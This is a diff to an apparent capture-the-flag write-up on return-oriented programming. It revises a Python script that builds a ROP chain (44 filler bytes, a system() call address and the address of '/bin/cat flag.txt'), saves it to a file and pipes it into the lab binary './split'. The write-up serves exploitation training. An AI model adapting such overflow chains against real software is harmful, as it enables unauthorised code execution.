@@ -80,10 +80,10 @@ Let's summarize in a tables the details we discovered from the research that are
 Now we can build the ROP Chain. First, it will consist of 44 garbage characters. Immediately after that, the **address of the command that calls** the `system()` function will appear. As mentioned, the `system()` function expects the call to be made when the address of the string it will operate on is already at the top of the stack. When the program uses the malicious return value, the top of the stack will increase by 4 bytes. Therefore, immediately after the malicious return value, we will add the address of the string `"/bin/cat flag.txt"`.
 
 ```python
-# cracker.py
+# chain_builder.py
 import struct
 
-def little_endian(number)
+def little_endian(number):
     """
     : The function accepts a number not
     : exceeding 4 bytes in size and returns it
@@ -91,14 +91,26 @@ def little_endian(number)
     """
     return struct.pack("<I", number)
 
-fill_buffer              = b"X"*44
-call_system_code_address = 0x0804861a
-cat_string_address       = 0x0804a030
+# Parts of the chain
+fill_buffer           = b"X"*44
+call_system_CODE_ADDR = 0x0804861a
+cat_STRING_ADDR       = 0x0804a030
 
-ROP_Chain =\
-    fill_buffer +\
-    little_endian(call_system_code_address) +\
-    little_endian(cat_string_address)
+# Building the chain
+ROP_Chain = fill_buffer
+ROP_Chain += little_endian(call_system_CODE_ADDR)
+ROP_Chain += little_endian(cat_STRING_ADDR)
 
-print(ROP_Chain)
+# Saving the chain in a binary file
+with open("rop_chain", "wb") as f:
+    f.write(ROP_Chain)
 ```
+```
+python3 chain_builder.py
+```
+```
+cat rop_chain | ./split
+```
+![](./8.png)
+
+Haida!
